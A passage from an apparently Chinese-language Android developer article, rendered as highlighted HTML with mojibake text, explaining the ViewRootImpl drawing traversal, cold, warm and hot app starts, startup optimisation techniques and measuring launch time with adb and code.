            <span class="hljs-comment">// 3. æ·»åŠ åˆ°WindowManagerService</span>
            res = mWindowSession.addToDisplay(...);
            
            <span class="hljs-comment">// 4. è®¾ç½®Inputäº‹ä»¶æ¥æ”¶</span>
            <span class="hljs-keyword">if</span> (mInputChannel != <span class="hljs-literal">null</span>) {
                mInputEventReceiver = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WindowInputEventReceiver</span>(...);
            }
        }
    }
}

<span class="hljs-comment">// ViewRootImpl.requestLayout()</span>
<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestLayout</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">if</span> (!mHandlingLayoutInLayoutRequest) {
        <span class="hljs-comment">// æ£€æŸ¥çº¿ç¨‹</span>
        checkThread();
        
        <span class="hljs-comment">// æ ‡è®°éœ€è¦å¸ƒå±€</span>
        mLayoutRequested = <span class="hljs-literal">true</span>;
        
        <span class="hljs-comment">// å®‰æ’éå†</span>
        scheduleTraversals();
    }
}

<span class="hljs-comment">// ViewRootImpl.scheduleTraversals()</span>
<span class="hljs-keyword">void</span> <span class="hljs-title function_">scheduleTraversals</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">if</span> (!mTraversalScheduled) {
        mTraversalScheduled = <span class="hljs-literal">true</span>;
        
        <span class="hljs-comment">// 1. æ·»åŠ åŒæ­¥å±éšœ</span>
        mTraversalBarrier = mHandler.getLooper().getQueue().postSyncBarrier();
        
        <span class="hljs-comment">// 2. å®‰æ’Choreographerå›è°ƒ</span>
        mChoreographer.postCallback(
            Choreographer.CALLBACK_TRAVERSAL,
            mTraversalRunnable,
            <span class="hljs-literal">null</span>);
        
        <span class="hljs-comment">// 3. å¦‚æœéœ€è¦ï¼Œå‘é€å”¤é†’æ¶ˆæ¯</span>
        notifyRendererOfFramePending();
    }
}

<span class="hljs-comment">// éå†æ‰§è¡Œçš„Runnable</span>
<span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TraversalRunnable</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Runnable</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> {
        doTraversal();
    }
}

<span class="hljs-comment">// æ‰§è¡Œéå†</span>
<span class="hljs-keyword">void</span> <span class="hljs-title function_">doTraversal</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">if</span> (mTraversalScheduled) {
        mTraversalScheduled = <span class="hljs-literal">false</span>;
        
        <span class="hljs-comment">// ç§»é™¤åŒæ­¥å±éšœ</span>
        mHandler.getLooper().getQueue().removeSyncBarrier(mTraversalBarrier);
        
        <span class="hljs-comment">// æ‰§è¡Œéå†</span>
        performTraversals();
    }
}
</code></pre>
<h4 data-id="heading-18"><strong>4. performTraversals() - æ ¸å¿ƒç»˜åˆ¶æµç¨‹</strong></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">performTraversals</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// ä¸´æ—¶å˜é‡</span>
    <span class="hljs-keyword">final</span> <span class="hljs-type">View</span> <span class="hljs-variable">host</span> <span class="hljs-operator">=</span> mView;
    
    <span class="hljs-comment">// 1. æµ‹é‡é˜¶æ®µ</span>
    <span class="hljs-keyword">if</span> (mFirst || windowShouldResize || ...) {
        <span class="hljs-comment">// æ‰§è¡Œæµ‹é‡</span>
        performMeasure(childWidthMeasureSpec, childHeightMeasureSpec);
    }
    
    <span class="hljs-comment">// 2. å¸ƒå±€é˜¶æ®µ</span>
    <span class="hljs-keyword">if</span> (didLayout) {
        <span class="hljs-comment">// æ‰§è¡Œå¸ƒå±€</span>
        performLayout(lp, mWidth, mHeight);
    }
    
    <span class="hljs-comment">// 3. ç»˜åˆ¶é˜¶æ®µ</span>
    <span class="hljs-keyword">if</span> (!cancelDraw &amp;&amp; !newSurface) {
        <span class="hljs-keyword">if</span> (mPendingTransitions != <span class="hljs-literal">null</span> &amp;&amp; mPendingTransitions.size() &gt; <span class="hljs-number">0</span>) {
            <span class="hljs-comment">// å¤„ç†è½¬åœºåŠ¨ç”»</span>
            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; mPendingTransitions.size(); ++i) {
                mPendingTransitions.get(i).startChangingAnimations();
            }
            mPendingTransitions.clear();
        }
        
        <span class="hljs-comment">// æ‰§è¡Œç»˜åˆ¶</span>
        performDraw();
    }
}

<span class="hljs-comment">// ä¸‰ä¸ªæ ¸å¿ƒé˜¶æ®µ</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">performMeasure</span><span class="hljs-params">(<span class="hljs-type">int</span> widthMeasureSpec, <span class="hljs-type">int</span> heightMeasureSpec)</span> {
    <span class="hljs-comment">// è°ƒç”¨View.measure()</span>
    mView.measure(widthMeasureSpec, heightMeasureSpec);
}

<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">performLayout</span><span class="hljs-params">(WindowManager.LayoutParams lp, 
                          <span class="hljs-type">int</span> desiredWindowWidth, <span class="hljs-type">int</span> desiredWindowHeight)</span> {
    <span class="hljs-comment">// è°ƒç”¨View.layout()</span>
    mView.layout(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, mView.getMeasuredWidth(), mView.getMeasuredHeight());
}

<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">performDraw</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">if</span> (!dirty.isEmpty() || mIsAnimating) {
        <span class="hljs-comment">// ç¡¬ä»¶åŠ é€Ÿç»˜åˆ¶</span>
        <span class="hljs-keyword">if</span> (mAttachInfo.mHardwareRenderer != <span class="hljs-literal">null</span> &amp;&amp; mAttachInfo.mHardwareRenderer.isEnabled()) {
            <span class="hljs-comment">// ç¡¬ä»¶æ¸²æŸ“</span>
            mAttachInfo.mHardwareRenderer.draw(mView, mAttachInfo, <span class="hljs-built_in">this</span>);
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// è½¯ä»¶ç»˜åˆ¶</span>
            <span class="hljs-keyword">if</span> (!drawSoftware(surface, mAttachInfo, xOffset, yOffset, 
                            scalingRequired, dirty)) {
                <span class="hljs-keyword">return</span>;
            }
        }
    }
}
</code></pre>
<h3 data-id="heading-19">å…­ã€å†·å¯åŠ¨ã€æ¸©å¯åŠ¨ã€çƒ­å¯åŠ¨</h3>
<h4 data-id="heading-20"><strong>1. å¯åŠ¨ç±»å‹å¯¹æ¯”</strong></h4>

































<table><thead><tr><th>ç±»å‹</th><th>è¿›ç¨‹çŠ¶æ€</th><th>å¯åŠ¨é€Ÿåº¦</th><th>æ¶ˆè€—èµ„æº</th><th>æ‰§è¡Œæµç¨‹</th></tr></thead><tbody><tr><td><strong>å†·å¯åŠ¨</strong></td><td>è¿›ç¨‹ä¸å­˜åœ¨</td><td>æ…¢</td><td>é«˜</td><td>åˆ›å»ºè¿›ç¨‹ â†’ åˆ›å»ºApplication â†’ åˆ›å»ºActivity</td></tr><tr><td><strong>æ¸©å¯åŠ¨</strong></td><td>è¿›ç¨‹å­˜åœ¨ï¼ŒActivityè¢«é”€æ¯</td><td>ä¸­ç­‰</td><td>ä¸­ç­‰</td><td>åˆ›å»ºActivityï¼ˆApplicationå·²å­˜åœ¨ï¼‰</td></tr><tr><td><strong>çƒ­å¯åŠ¨</strong></td><td>Activityåœ¨åå°</td><td>å¿«</td><td>ä½</td><td>æ¢å¤Activityï¼ˆonRestart â†’ onStart â†’ onResumeï¼‰</td></tr></tbody></table>
<h4 data-id="heading-21"><strong>2. å†·å¯åŠ¨è¯¦ç»†æ—¶é—´çº¿</strong></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å†·å¯åŠ¨æ—¶é—´åˆ†å¸ƒ</span>
T0: ç‚¹å‡»å›¾æ ‡
    â†“
T1: è¿›ç¨‹åˆ›å»ºå®Œæˆï¼ˆfork + åˆå§‹åŒ–ï¼‰
    â”‚   â”œâ”€â”€ Zygote fork: ~50ms
    â”‚   â”œâ”€â”€ åŠ è½½ART: ~100ms
    â”‚   â””â”€â”€ åˆå§‹åŒ–Runtime: ~50ms
    â†“
T2: Application.onCreate()å®Œæˆ
    â”‚   â”œâ”€â”€ åˆ›å»ºApplication: ~20ms
    â”‚   â”œâ”€â”€ ContentProvideråˆå§‹åŒ–: ~50ms
    â”‚   â””â”€â”€ ç¬¬ä¸‰æ–¹åº“åˆå§‹åŒ–: ~100ms
    â†“
T3: Activity.onCreate()å®Œæˆ
    â”‚   â”œâ”€â”€ åŠ è½½ä¸»é¢˜: ~30ms
    â”‚   â”œâ”€â”€ å¸ƒå±€inflate: ~80ms
    â”‚   â””â”€â”€ Viewåˆå§‹åŒ–: ~50ms
    â†“
T4: ç¬¬ä¸€å¸§ç»˜åˆ¶å®Œæˆ
    â”‚   â”œâ”€â”€ æµ‹é‡/å¸ƒå±€: ~30ms
    â”‚   â”œâ”€â”€ ç»˜åˆ¶: ~50ms
    â”‚   â””â”€â”€ åŒæ­¥åˆ°å±å¹•: ~16ms
    â†“
T5: ç”¨æˆ·å¯äº¤äº’
</code></pre>
<h3 data-id="heading-22">ä¸ƒã€å¯åŠ¨ä¼˜åŒ–ç­–ç•¥</h3>
<h4 data-id="heading-23"><strong>1. Application ä¼˜åŒ–</strong></h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyApplication</span> : <span class="hljs-type">Application</span>() {
    
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onCreate</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">super</span>.onCreate()
        
        <span class="hljs-comment">// âœ… 1. å»¶è¿Ÿåˆå§‹åŒ–</span>
        initDelayedComponents()
        
        <span class="hljs-comment">// âœ… 2. åå°çº¿ç¨‹åˆå§‹åŒ–</span>
        initInBackground()
        
        <span class="hljs-comment">// âœ… 3. æŒ‰éœ€åˆå§‹åŒ–</span>
        initOnDemand()
        
        <span class="hljs-comment">// âŒ é¿å…åœ¨ä¸»çº¿ç¨‹åšè¿™äº›ï¼š</span>
        <span class="hljs-comment">// - æ–‡ä»¶IOæ“ä½œ</span>
        <span class="hljs-comment">// - ç½‘ç»œè¯·æ±‚</span>
        <span class="hljs-comment">// - å¤§é‡æ•°æ®åº“æŸ¥è¯¢</span>
        <span class="hljs-comment">// - å¤æ‚çš„è®¡ç®—</span>
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">initDelayedComponents</span><span class="hljs-params">()</span></span> {
        <span class="hljs-comment">// ä½¿ç”¨Lifecycleè§‚å¯Ÿè€…å»¶è¿Ÿåˆå§‹åŒ–</span>
        ProcessLifecycleOwner.<span class="hljs-keyword">get</span>().lifecycle.addObserver(<span class="hljs-keyword">object</span> : LifecycleObserver {
            <span class="hljs-meta">@OnLifecycleEvent(Lifecycle.Event.ON_CREATE)</span>
            <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onCreate</span><span class="hljs-params">()</span></span> {
                <span class="hljs-comment">// å»¶è¿Ÿåˆå§‹åŒ–</span>
            }
        })
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">initInBackground</span><span class="hljs-params">()</span></span> {
        <span class="hljs-comment">// ä½¿ç”¨WorkManageræˆ–Coroutineåœ¨åå°åˆå§‹åŒ–</span>
        CoroutineScope(Dispatchers.IO).launch {
            <span class="hljs-comment">// åˆå§‹åŒ–ç¬¬ä¸‰æ–¹åº“ç­‰</span>
        }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">initOnDemand</span><span class="hljs-params">()</span></span> {
        <span class="hljs-comment">// æ‡’åŠ è½½æ¨¡å¼</span>
        <span class="hljs-keyword">val</span> heavyLibrary <span class="hljs-keyword">by</span> lazy {
            <span class="hljs-comment">// ç¬¬ä¸€æ¬¡ä½¿ç”¨æ—¶æ‰åˆå§‹åŒ–</span>
            HeavyLibrary()
        }
    }
}
</code></pre>
<h4 data-id="heading-24"><strong>2. Activity ä¼˜åŒ–</strong></h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> : <span class="hljs-type">AppCompatActivity</span>() {
    
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(savedInstanceState: <span class="hljs-type">Bundle</span>?)</span></span> {
        <span class="hljs-comment">// âœ… 1. åœ¨super.onCreateå‰è®¾ç½®ä¸»é¢˜</span>
        setTheme(R.style.AppTheme_Launcher)
        
        <span class="hljs-keyword">super</span>.onCreate(savedInstanceState)
        
        <span class="hljs-comment">// âœ… 2. å¼‚æ­¥åŠ è½½æ•°æ®</span>
        loadDataAsync()
        
        <span class="hljs-comment">// âœ… 3. å»¶è¿ŸåŠ è½½View</span>
        setContentView(R.layout.activity_main)
        
        <span class="hljs-comment">// âœ… 4. åˆ†æ‰¹åˆå§‹åŒ–View</span>
        initEssentialViews()
        postDelayed({ initSecondaryViews() }, <span class="hljs-number">300</span>)
        
        <span class="hljs-comment">// âœ… 5. ä½¿ç”¨ViewStubå»¶è¿ŸåŠ è½½å¤æ‚å¸ƒå±€</span>
        findViewById&lt;ViewStub&gt;(R.id.stub_complex_layout).apply {
            setOnInflateListener { stub, inflated -&gt;
                <span class="hljs-comment">// å¸ƒå±€è¢«inflateæ—¶åˆå§‹åŒ–</span>
                initComplexViews(inflated)
            }
        }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">loadDataAsync</span><span class="hljs-params">()</span></span> {
        viewModelScope.launch(Dispatchers.IO) {
            <span class="hljs-keyword">val</span> <span class="hljs-keyword">data</span> = repository.loadData()
            withContext(Dispatchers.Main) {
                <span class="hljs-comment">// æ›´æ–°UI</span>
            }
        }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">initEssentialViews</span><span class="hljs-params">()</span></span> {
        <span class="hljs-comment">// åªåˆå§‹åŒ–å¿…è¦çš„View</span>
        toolbar = findViewById(R.id.toolbar)
        recyclerView = findViewById(R.id.recycler_view)
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">initSecondaryViews</span><span class="hljs-params">()</span></span> {
        <span class="hljs-comment">// å»¶è¿Ÿåˆå§‹åŒ–æ¬¡è¦View</span>
        fab = findViewById(R.id.fab)
        bottomNavigation = findViewById(R.id.bottom_nav)
    }
}
</code></pre>
<h4 data-id="heading-25"><strong>3. å¸ƒå±€ä¼˜åŒ–</strong></h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- ä½¿ç”¨ConstraintLayoutå‡å°‘å±‚çº§ --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">androidx.constraintlayout.widget.ConstraintLayout</span>
    <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span>
    <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"match_parent"</span>&gt;</span>
    
    <span class="hljs-comment">&lt;!-- é¿å…åµŒå¥—LinearLayout --&gt;</span>
    
    <span class="hljs-comment">&lt;!-- ä½¿ç”¨mergeæ ‡ç­¾å‡å°‘å±‚çº§ --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">merge</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- å­å¸ƒå±€å†…å®¹ --&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">merge</span>&gt;</span>
    
    <span class="hljs-comment">&lt;!-- ä½¿ç”¨ViewStubå»¶è¿ŸåŠ è½½ --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">ViewStub</span>
        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/stub_heavy_view"</span>
        <span class="hljs-attr">android:layout</span>=<span class="hljs-string">"@layout/heavy_layout"</span>
        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span>
        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span>/&gt;</span>
        
<span class="hljs-tag">&lt;/<span class="hljs-name">androidx.constraintlayout.widget.ConstraintLayout</span>&gt;</span>
</code></pre>
<h4 data-id="heading-26"><strong>4. å¯åŠ¨å™¨æ¨¡å¼</strong></h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// å¯åŠ¨ä»»åŠ¡ç®¡ç†å™¨</span>
<span class="hljs-keyword">object</span> AppStartupManager {
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> tasks = mutableListOf&lt;StartupTask&gt;()
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> executor = Executors.newFixedThreadPool(<span class="hljs-number">4</span>)
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">addTask</span><span class="hljs-params">(task: <span class="hljs-type">StartupTask</span>)</span></span> {
        tasks.add(task)
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">start</span><span class="hljs-params">(onComplete: () -&gt; <span class="hljs-type">Unit</span>)</span></span> {
        <span class="hljs-comment">// 1. ç«‹å³æ‰§è¡Œçš„ä»»åŠ¡ï¼ˆåœ¨ä¸»çº¿ç¨‹ï¼‰</span>
        <span class="hljs-keyword">val</span> immediateTasks = tasks.filter { it.priority == Priority.IMMEDIATE }
        immediateTasks.forEach { it.execute() }
        
        <span class="hljs-comment">// 2. åå°æ‰§è¡Œçš„ä»»åŠ¡</span>
        <span class="hljs-keyword">val</span> backgroundTasks = tasks.filter { it.priority == Priority.BACKGROUND }
        backgroundTasks.forEach { task -&gt;
            executor.submit {
                task.execute()
            }
        }
        
        <span class="hljs-comment">// 3. å»¶è¿Ÿæ‰§è¡Œçš„ä»»åŠ¡</span>
        <span class="hljs-keyword">val</span> delayedTasks = tasks.filter { it.priority == Priority.DELAYED }
        Handler(Looper.getMainLooper()).postDelayed({
            delayedTasks.forEach { it.execute() }
            onComplete()
        }, <span class="hljs-number">1000</span>)
    }
}

<span class="hljs-comment">// å¯åŠ¨ä»»åŠ¡å®šä¹‰</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">StartupTask</span> {
    <span class="hljs-keyword">val</span> priority: Priority
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">execute</span><span class="hljs-params">()</span></span>
}

<span class="hljs-keyword">enum</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Priority</span> {
    IMMEDIATE,    <span class="hljs-comment">// ç«‹å³æ‰§è¡Œï¼ˆä¸»çº¿ç¨‹ï¼‰</span>
    BACKGROUND,   <span class="hljs-comment">// åå°æ‰§è¡Œ</span>
    DELAYED       <span class="hljs-comment">// å»¶è¿Ÿæ‰§è¡Œ</span>
}

<span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">MyApplication</span> : <span class="hljs-type">Application</span>() {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onCreate</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">super</span>.onCreate()
        
        AppStartupManager.apply {
            addTask(<span class="hljs-keyword">object</span> : StartupTask {
                <span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> priority = Priority.IMMEDIATE
                <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">execute</span><span class="hljs-params">()</span></span> {
                    <span class="hljs-comment">// åˆå§‹åŒ–Analytics</span>
                }
            })
            
            addTask(<span class="hljs-keyword">object</span> : StartupTask {
                <span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> priority = Priority.BACKGROUND
                <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">execute</span><span class="hljs-params">()</span></span> {
                    <span class="hljs-comment">// åˆå§‹åŒ–æ•°æ®åº“</span>
                }
            })
            
            addTask(<span class="hljs-keyword">object</span> : StartupTask {
                <span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> priority = Priority.DELAYED
                <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">execute</span><span class="hljs-params">()</span></span> {
                    <span class="hljs-comment">// é¢„åŠ è½½æ•°æ®</span>
                }
            })
        }
        
        <span class="hljs-comment">// å¯åŠ¨æ‰€æœ‰ä»»åŠ¡</span>
        AppStartupManager.start {
            <span class="hljs-comment">// æ‰€æœ‰ä»»åŠ¡å®Œæˆåçš„å›è°ƒ</span>
        }
    }
}
</code></pre>
<h4 data-id="heading-27"><strong>5. ä½¿ç”¨ Jetpack Startup åº“</strong></h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// æ·»åŠ ä¾èµ–</span>
dependencies {
    implementation <span class="hljs-string">"androidx.startup:startup-runtime:1.1.1"</span>
}

<span class="hljs-comment">// å®šä¹‰åˆå§‹åŒ–å™¨</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">AnalyticsInitializer</span> : <span class="hljs-type">Initializer</span>&lt;<span class="hljs-type">Analytics</span>&gt; {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">create</span><span class="hljs-params">(context: <span class="hljs-type">Context</span>)</span></span>: Analytics {
        <span class="hljs-comment">// åˆå§‹åŒ–Analytics SDK</span>
        <span class="hljs-keyword">return</span> Analytics.<span class="hljs-keyword">init</span>(context)
    }
    
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">dependencies</span><span class="hljs-params">()</span></span>: List&lt;Class&lt;<span class="hljs-keyword">out</span> Initializer&lt;*&gt;&gt;&gt; {
        <span class="hljs-comment">// ä¾èµ–å…¶ä»–åˆå§‹åŒ–å™¨</span>
        <span class="hljs-keyword">return</span> listOf(DatabaseInitializer::<span class="hljs-keyword">class</span>.java)
    }
}

<span class="hljs-comment">// è‡ªåŠ¨åˆå§‹åŒ–é…ç½®</span>
&lt;provider
    android:name=<span class="hljs-string">"androidx.startup.InitializationProvider"</span>
    android:authorities=<span class="hljs-string">"<span class="hljs-subst">${applicationId}</span>.androidx-startup"</span>
    android:exported=<span class="hljs-string">"false"</span>
    tools:node=<span class="hljs-string">"merge"</span>&gt;
    
    &lt;meta-<span class="hljs-keyword">data</span>
        android:name=<span class="hljs-string">"com.example.AnalyticsInitializer"</span>
        android:value=<span class="hljs-string">"androidx.startup"</span> /&gt;
        
&lt;/provider&gt;

<span class="hljs-comment">// æ‰‹åŠ¨åˆå§‹åŒ–ï¼ˆæŒ‰éœ€ï¼‰</span>
AppInitializer.getInstance(context)
    .initializeComponent(AnalyticsInitializer::<span class="hljs-keyword">class</span>.java)
</code></pre>
<h3 data-id="heading-28">å…«ã€å¯åŠ¨æ—¶é—´æµ‹é‡</h3>
<h4 data-id="heading-29"><strong>1. ä½¿ç”¨ ADB æµ‹é‡</strong></h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æµ‹é‡å†·å¯åŠ¨æ—¶é—´</span>
adb shell am start-activity -W -n com.example/.MainActivity

<span class="hljs-comment"># è¾“å‡ºç¤ºä¾‹ï¼š</span>
<span class="hljs-comment"># Starting: Intent { cmp=com.example/.MainActivity }</span>
<span class="hljs-comment"># Status: ok</span>
<span class="hljs-comment"># Activity: com.example/.MainActivity</span>
<span class="hljs-comment"># ThisTime: 1000  # å½“å‰Activityå¯åŠ¨è€—æ—¶</span>
<span class="hljs-comment"># TotalTime: 1000 # åº”ç”¨å¯åŠ¨æ€»è€—æ—¶ï¼ˆåŒ…æ‹¬å‰ä¸€ä¸ªActivity pauseæ—¶é—´ï¼‰</span>
<span class="hljs-comment"># WaitTime: 1000  # AMSå¯åŠ¨Activityçš„æ€»è€—æ—¶</span>
<span class="hljs-comment"># Complete</span>

<span class="hljs-comment"># æµ‹é‡å®Œå…¨å¯åŠ¨æ—¶é—´ï¼ˆç›´åˆ°ç”¨æˆ·å¯äº¤äº’ï¼‰</span>
adb shell am start-activity -S -R 10 -W com.example/.MainActivity

<span class="hljs-comment"># ä½¿ç”¨systraceåˆ†æå¯åŠ¨æ€§èƒ½</span>
python systrace.py -a com.example -o mytrace.html <span class="hljs-built_in">sched</span> gfx view wm am
</code></pre>
<h4 data-id="heading-30"><strong>2. ä»£ç ä¸­æµ‹é‡</strong></h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyApplication</span> : <span class="hljs-type">Application</span>() {
    
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onCreate</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">super</span>.onCreate()
        
        <span class="hljs-comment">// 1. ä½¿ç”¨Firebase Performance Monitoring</span>
        FirebasePerformance.getInstance()
            .newTrace(<span class="hljs-string">"app_start_trace"</span>)
            .start()
        
        <span class="hljs-comment">// 2. è‡ªå®šä¹‰æµ‹é‡</span>
        <span class="hljs-keyword">val</span> startTime = System.currentTimeMillis()
        
        <span class="hljs-comment">// ... åˆå§‹åŒ–ä»£ç </span>
        
        <span class="hljs-keyword">val</span> endTime = System.currentTimeMillis()
        <span class="hljs-keyword">val</span> duration = endTime - startTime
        
        <span class="hljs-comment">// è®°å½•åˆ°Analytics</span>
        FirebaseAnalytics.getInstance(<span class="hljs-keyword">this</span>).logEvent(<span class="hljs-string">"app_start_duration"</span>, bundleOf(
            <span class="hljs-string">"duration_ms"</span> to duration
        ))
    }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> : <span class="hljs-type">AppCompatActivity</span>() {
    
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(savedInstanceState: <span class="hljs-type">Bundle</span>?)</span></span> {
        <span class="hljs-comment">// æµ‹é‡Activityåˆ›å»ºæ—¶é—´</span>
        <span class="hljs-keyword">val</span> activityStartTime = System.currentTimeMillis()
        
        <span class="hljs-keyword">super</span>.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        
        <span class="hljs-comment">// ç­‰å¾…ç¬¬ä¸€å¸§ç»˜åˆ¶</span>
        window.decorView.post {
            <span class="hljs-keyword">val</span> activityEndTime = System.currentTimeMillis()
            <span class="hljs-keyword">val</span> activityDuration = activityEndTime - activityStartTime
            
            <span class="hljs-comment">// è®°å½•Activityå¯åŠ¨æ—¶é—´</span>
            logDuration(<span class="hljs-string">"activity_create"</span>, activityDuration)
        }
    }
    
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onWindowFocusChanged</span><span class="hljs-params">(hasFocus: <span class="hljs-type">Boolean</span>)</span></span> {
        <span class="hljs-keyword">super</span>.onWindowFocusChanged(hasFocus)
        
        <span class="hljs-keyword">if</span> (hasFocus) {
            <span class="hljs-comment">// æ­¤æ—¶ç”¨æˆ·å¯ä»¥ä¸ç•Œé¢äº¤äº’</span>
            <span class="hljs-keyword">val</span> appStartTime = getSharedPreferences(<span class="hljs-string">"app_start"</span>, MODE_PRIVATE)
                .getLong(<span class="hljs-string">"start_time"</span>, <span class="hljs-number">0</span>)
            
            <span class="hljs-keyword">if</span> (appStartTime &gt; <span class="hljs-number">0</span>) {
                <span class="hljs-keyword">val</span> totalDuration = System.currentTimeMillis() - appStartTime
                logDuration(<span class="hljs-string">"app_start_total"</span>, totalDuration)
            }
        }
    }
}
</code></pre>
<h3 data-id="heading-31">ä¹ã€å¯åŠ¨ç™½å±/é»‘å±é—®é¢˜</h3>
<h4 data-id="heading-32"><strong>1. å¯åŠ¨ä¸»é¢˜ä¼˜åŒ–</strong></h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- styles.xml --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"AppTheme"</span> <span class="hljs-attr">parent</span>=<span class="hljs-string">"Theme.MaterialComponents.DayNight.NoActionBar"</span>&gt;</span><span class="xml">
    <span class="hljs-comment">&lt;!-- æ­£å¸¸ä¸»é¢˜ --&gt;</span>
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"AppTheme.Launcher"</span> <span class="hljs-attr">parent</span>=<span class="hljs-string">"AppTheme"</span>&gt;</span><span class="xml">
    <span class="hljs-comment">&lt;!-- å¯åŠ¨ä¸»é¢˜ï¼Œé¿å…ç™½å± --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">item</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"android:windowBackground"</span>&gt;</span>@drawable/launch_screen<span class="hljs-tag">&lt;/<span class="hljs-name">item</span>&gt;</span>
